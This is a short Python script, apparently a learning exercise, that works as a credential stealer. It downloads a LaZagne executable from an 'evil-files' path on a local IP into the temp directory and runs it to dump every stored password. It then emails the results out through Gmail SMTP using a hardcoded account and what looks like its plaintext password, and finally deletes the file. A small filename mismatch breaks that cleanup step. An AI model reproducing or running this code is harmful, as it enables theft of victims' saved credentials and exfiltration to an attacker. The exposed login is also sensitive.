#!usr/bin/env python3

import requests, smtplib, subprocess,os,tempfile

def download(url):
    get_responce = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_responce.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://192.168.163.141/evil-files/lazange.exe")
result = subprocess.check_output("lazange.exe all", shell=True)
send_mail("prathishbv.19it@kongu.edu", "bvprathishsri7701", result)
os.remove("laZagne.exe")